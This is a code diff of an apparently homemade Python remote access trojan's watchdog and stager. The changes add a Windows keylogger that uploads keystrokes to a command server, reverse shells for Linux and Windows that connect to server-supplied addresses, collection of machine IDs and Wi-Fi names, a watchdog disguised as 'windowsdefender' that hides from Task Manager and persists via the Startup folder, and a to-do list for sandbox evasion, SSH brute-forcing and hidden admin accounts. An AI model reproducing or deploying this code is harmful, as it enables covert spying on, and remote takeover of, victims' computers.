@@ -7,23 +7,70 @@ import requests
 import shutil
 import getpass
 import threading
+import sys
+from ctypes import *
 
-### TO DO
-# CREATE STAGE 0 STUB, THAT EXEC WATCHDOG SCRIPT FROM MEMORY #
-# ENCRYPT EXEC SCRIPTS AND DECRYPT AT RUNTIME #
+### TO DO ###
+
+# ENCRYPT EXEC SCRIPTS AND DECRYPT AT RUNTIME 
+# ENCRYPT POST URL REQUESTS, Decrypt from server side
+# GUI HTML
+
+### AUTOSTART OPTIONS ###
+
+# 1 STARTUP FOLDER
+# 2 WINREG STARTUP
+# 3 DESKTOP SHORTCUT CHANGE
+
+
+### PAYLOAD COMMANDS ###
+
+# CAMSHOT
+# GET OPEN WINDOW
+# GET BROWSER HISTORY
+# GET BROWSER DATA
+# GET WINDOW IN FOCUS
+# Detect ssh in networks
+# Brute force ssh networks
+
+
+# DBCONFIG
+# ADD DELAY BETWEEN COMMAND CHECK REQUESTS
+
+### Security / Prevemptive ###
+
+# Detect Virtual Machine
+# Detect sandboxes
+# Detect debugger
+# Detect wsl on windows
+# Detect fresh operating system
+# Detect reverse engineering tools
+
+### Quality of Life fixes ###
+
+# Detect linux distrubtion for startup folder directory
+# Create hidden admin user
+# Start keylogger when specific application are in Focus
+# AUTHENTICATE UUID HANDSHAKE 
+
 
 OS = platform.uname()[0]
+print(OS)
+if OS == "Windows":
+    current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
+
+
 
 ### NAME OF PAYLOAD AND WATCHDOG FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
 _PAYLOAD_NAME = "payload"
-_WATCHDOG_NAME = "watchdog"
+_WATCHDOG_NAME = "windowsdefender"
 
 ### IF AUTO START == 1, WATCHDOG WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
 _AUTOSTART_WATCHDOG = 1
 _AUTOSTART_WATCHDOG_DESKTOP_SHORTCUTS = 0
 
 ### FULL ADDRESS TO THE WEBSERVER
-_WEB_SERVER = "192.168.1.6:3000"
+_WEB_SERVER = "127.0.0.1:3000"
 
 ### REMOVE FROM STARTUP UNRIL TASKMANAGER IS CLOSED WINDOWS ONLY ####
 _WIN_TASK_MANANGER_REMOVE_STARTUP = 0
@@ -38,51 +85,112 @@ _STAGING_OPT = 1
 
 root = 0
 
+### If staging == 1, load these variable's , eval payload needs these variables to run properly ###
+
 if _STAGING_OPT == 1:
     import random
     import shlex
-    import pyautogui
     import datetime
     import PIL
+
+    if OS == "Windows":
+        import pyautogui
+    else:pass
+    
     # PAYLOAD OPTIONS #
 
-    ### ENABLE REMOTE SHELL ###
-    _RSHELL_OPT = 1
-    ### ATTEMPT TO SPREAD TO A LOCAL PC OR DEVICE ###
-    _SPREAD_OPT = 0
     _FAST_ROOT_OPT = 0
-    _AUTO_UPLOAD_CREDS_OPT = 0
-
     _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
     _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
     _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
     _OS = platform.uname()[0]
     username = getpass.getuser()
+
+    ### Get current clients ip address from master server ###
+
     def get_ip():
-        
         try:
                 proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                 return proc.content.decode('utf8')
 
         except Exception as e:
-            
             pass
             
     _MY_IP = get_ip()
     while _MY_IP == None:
         _MY_IP = get_ip()
 
+    ### Get current clients master reverse shell information ###
+
     def get__RSHELL_OPT_ip():
         try:
-            proc = requests.get('http://{0}/rshell/{1}/{2}'.format(_WEB_SERVER, _MY_IP, getpass.getuser()))
+            proc = requests.get('http://{0}/rshell/{1}/{2}/{3}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id))
             return proc.content.decode('utf8')
         except Exception as e:
             pass
+    
+    ### Requests to insert found wifi names into database ###
+
+    def insert_wifi_name(wifi_name):
+        try:
+            proc = requests.get('http://{0}/wifi_name/{1}/{2}'.format(_WEB_SERVER, current_machine_id, wifi_name))
+
+        except Exception as e:
+            pass
+    
+    ### Start keylogger ###
+
+    def start_keylogger():
+        GetAsyncKeyState = cdll.user32.GetAsyncKeyState
+
+        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
+        log = []
+        logstring = ""
+
+        # reset key states
+        for i in range(256):
+            GetAsyncKeyState(i)
+
+        while True:
+            if len(log) >= 25:
+                print("fine wine")
+                # UPLOAD LOG HERE #
+                for character in log:
+                    logstring = logstring + character
+                print(logstring)
+                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
+                logstring = ""
+                    
+                log = []
+            for i in range(256):
+                if GetAsyncKeyState(i) & 1:
+                    if i in special_keys:
+                        pass
+                    elif 0x30 <= i <= 0x5a:
+                        ### characters a-z/0-9 ###
+                        print ("%c" % i,)
+                        print('cool')
+                        log.append("%c" % i,)
+                        print(log)
+
+                    else:
+                        pass
+    
+    ### Reverse shell function ###
 
     def _RSHELL_OPT_():
+        print(get__RSHELL_OPT_ip().split()[0])
+        print(get__RSHELL_OPT_ip().split()[1])
         try:
             if platform.uname()[0] == "Linux":
-                    exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip()))
+                    try:
+                        exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip().split()[0], get__RSHELL_OPT_ip().split()[1]))
+                    except Exception as e:
+                        print(e)
+                        timer = threading.Timer(5, _RSHELL_OPT_)
+                        timer.start()
+                        pass
+                        
             elif platform.uname()[0] == "Windows":
                 import os,socket,subprocess,threading;
                 def s2p(s, p):
@@ -95,7 +203,6 @@ if _STAGING_OPT == 1:
                 def p2s(s, p):
                     while True:
                         s.send(p.stdout.read(1))
-                print(get__RSHELL_OPT_ip().split()[1])
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 s.connect(("{0}".format(get__RSHELL_OPT_ip().split()[0]), int(get__RSHELL_OPT_ip().split()[1])))
                 p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
@@ -109,15 +216,12 @@ if _STAGING_OPT == 1:
                     p.wait()
                 except KeyboardInterrupt:
                     s.close()
-                    timer = threading.Timer(60, _RSHELL_OPT_)
+                    timer = threading.Timer(5, _RSHELL_OPT_)
                     timer.start()
                     pass
         except Exception as e:
-            print(e)
-            timer = threading.Timer(60, _RSHELL_OPT_)
-            timer.start()
+            print(e)     
             pass
-
 
 ### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
 if OS == "Linux":
@@ -134,15 +238,15 @@ def start_windows_payload():
 
 ### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
 if _AUTOSTART_WATCHDOG == 1:
-    print("checking for startup file")
     if platform.uname()[0] == "Linux":
-        if _WATCHDOG_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
-            print("watching dog is in startup")
-            pass
+        try:
+            if _WATCHDOG_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
+                pass
+
+        except Exception as e:
+            print('cant find config startupfolder')
         else:
-            print("payload not found")
             try:
-                print("file doesnt exists")
                 requests.get(_WATCHDOG_LINK)
                 r = requests.get(_WATCHDOG_LINK)
                 file = open("./{0}".format(_WATCHDOG_NAME), 'wb')
@@ -163,13 +267,10 @@ if _AUTOSTART_WATCHDOG == 1:
                 pass
             
     elif platform.uname()[0] == "Windows":
-        print("windows pc")
         try:
             if "{0}.exe".format(_WATCHDOG_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
-                print("watching dog is in startup")
                 pass
             else:
-                    print("file doesnt exists")
                     requests.get(_WATCHDOG_LINK)
                     r = requests.get(_WATCHDOG_LINK)
                     file = open("./{0}.exe".format(_WATCHDOG_NAME), 'wb')
@@ -195,10 +296,8 @@ while 1:
     for PROC in psutil.process_iter():
         if _STAGING_OPT == 2:
             if PROC.name() == "payload.exe":
-                print("rat is running")
                 RUNNING = 1
         if PROC.name() == "Taskmgr.exe":
-            print("taskmanager is running")
             _WIN_TASK_MANAGER_RUNNING = 1
             
             if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
@@ -217,10 +316,8 @@ while 1:
                         if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                             subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
                             subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
-                            print('spawned rat')
                         
                     elif OS == "Windows":
-                        print("winwin")
                         if _WIN_TASK_MANAGER_RUNNING == 1:
                             pass
                         
@@ -230,7 +327,6 @@ while 1:
                                 threading.Thread(target=start_windows_payload).start()
                                 time.sleep(5)
                                 
-                                print('spawned rat')
                             else:
                                 requests.get(_PAYLOAD_LINK)
                                 r = requests.get(_PAYLOAD_LINK)
@@ -241,20 +337,16 @@ while 1:
                             
                 except Exception as e:
                     print(e)
-                    pass
-
-                    
+                    pass   
 
 ### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
     if _WIN_TASK_MANAGER_RUNNING == 1:
-        print("task manager running")
         try:
                 if OS == "Linux":
                     if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                         pass
                     
                 elif OS == "Windows":
-                    print("winwin")
 
 ### IF PAYLOAD IS RUNNING WHILE TASKMANAGER IS RUNNING, KILL IT ###
                     if _STAGING_OPT == 2:
@@ -278,15 +370,15 @@ while 1:
                                 if len(PROC_LIST) == 0:
                                     _WIN_TASK_MANAGER_RUNNING = 0
                                     
-                            print(len(PROC_LIST))
-                            PROC_LIST = []                            
+                            PROC_LIST = []
+                            time.sleep(1)                        
                             
         except Exception as e:
             print(e)
             pass
+
 #### WHEN TASK MANAGER IS NO LONGER OPENED MOVE WATCHDOG FILE BACK TO THE STARTUP FOLDER ###
     if _WIN_TASK_MANAGER_RUNNING == 0:
-        print('no task manager')
         if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
             if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
                 os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME))
